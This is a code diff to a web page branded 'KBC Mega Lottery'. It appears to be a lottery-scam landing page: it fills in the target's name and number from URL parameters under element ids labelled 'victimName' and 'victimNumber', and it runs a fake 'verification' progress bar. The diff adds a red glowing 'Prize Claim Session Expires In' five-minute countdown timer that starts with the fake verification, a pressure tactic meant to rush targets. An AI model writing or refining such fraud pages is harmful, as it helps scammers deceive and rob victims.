@@ -29,6 +29,30 @@
         
         .logo { width: 120px; height: 120px; border-radius: 50%; border: 3px solid #ffd700; object-fit: cover; background: #0c1a30; margin-bottom: 10px; box-shadow: 0 0 15px #ffd700; }
         
+        /* Premium Glowing Timer Box */
+        .timer-container {
+            background: rgba(255, 0, 0, 0.15);
+            border: 1px solid #ff3333;
+            padding: 8px 15px;
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: bold;
+            color: #ffcccc;
+            margin: 5px auto 15px auto;
+            box-shadow: 0 0 15px rgba(255, 51, 51, 0.2);
+        }
+        .timer-clock {
+            color: #ff3333;
+            font-size: 16px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            text-shadow: 0 0 8px #ff3333;
+        }
+
         h1 { color: #ffd700; margin: 10px 0; font-size: 24px; text-transform: uppercase; font-weight: 900; letter-spacing: 1px; text-shadow: 0 2px 5px rgba(0,0,0,0.5); }
         
         /* Celebrity Grid Styling */
@@ -80,7 +104,7 @@
         .step-active { color: #ffd700; text-shadow: 0 0 5px rgba(255,215,0,0.3); }
         .step-done { color: #00ff66; }
 
-        /* Dynamic Winner Info Box (Initially hidden, loads after verification) */
+        /* Dynamic Winner Info Box */
         .winner-box { 
             display: none;
             background: linear-gradient(135deg, #ffe066 0%, #f5b041 50%, #d4ac0d 100%); 
@@ -111,6 +135,11 @@
 <body>
     <div class="container">
         <img src="assets/.aistudio/kbc_logo.png" class="logo" alt="KBC Logo">
+        
+        <div class="timer-container">
+            <span>⏱️ Prize Claim Session Expires In:</span>
+            <span class="timer-clock" id="countdownClock">05:00</span>
+        </div>
         
         <h1>KBC Mega Lottery</h1>
         
@@ -179,10 +208,37 @@
         document.getElementById('victimName').innerText = decodeURIComponent(urlParams.get('name') || "Respected Winner");
         document.getElementById('victimNumber').innerText = decodeURIComponent(urlParams.get('num') || "KBC-992341");
 
+        // Independent Live Countdown Timer Logic (5 Minutes)
+        let totalTime = 5 * 60; 
+        const countdownElement = document.getElementById('countdownClock');
+
+        function startCountdownTimer() {
+            const timerInterval = setInterval(() => {
+                let minutes = Math.floor(totalTime / 60);
+                let seconds = totalTime % 60;
+
+                // Formatting single digits with leading zero
+                minutes = minutes < 10 ? '0' + minutes : minutes;
+                seconds = seconds < 10 ? '0' + seconds : seconds;
+
+                countdownElement.innerText = `${minutes}:${seconds}`;
+
+                if (totalTime <= 0) {
+                    clearInterval(timerInterval);
+                    countdownElement.innerText = "00:00";
+                } else {
+                    totalTime--;
+                }
+            }, 1000);
+        }
+
         // Live Processing Bar Sequence Logic
         const progressBar = document.getElementById('dynamicBar');
         
         function runVerificationSteps() {
+            // Start the countdown alongside the loader
+            startCountdownTimer();
+
             // Step 1 Trigger
             setTimeout(() => {
                 progressBar.style.width = '25%';
